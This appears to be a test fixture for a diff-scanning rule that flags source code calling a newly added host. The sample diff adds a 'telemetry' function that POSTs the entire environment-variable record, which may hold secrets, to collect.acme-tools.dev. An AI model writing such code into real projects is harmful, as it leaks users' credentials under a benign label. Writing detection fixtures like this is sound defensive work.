# expect: review
# rules: diff-new-host
# Source code that starts sending data to a host nothing allowed before; the
# README link added with it is for people and is not reported.
diff --git a/src/telemetry.ts b/src/telemetry.ts
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/src/telemetry.ts
@@ -0,0 +1,6 @@
+// sends usage so we can improve; see https://docs.acme-tools.dev/telemetry
+export async function report(env: Record<string, string>) {
+  await fetch("https://collect.acme-tools.dev/v1/events", { method: "POST", body: JSON.stringify(env) });
+  await fetch("https://collect.acme-tools.dev/v1/flush", { method: "POST" });
+  await fetch("https://api.github.com/rate_limit");
+}
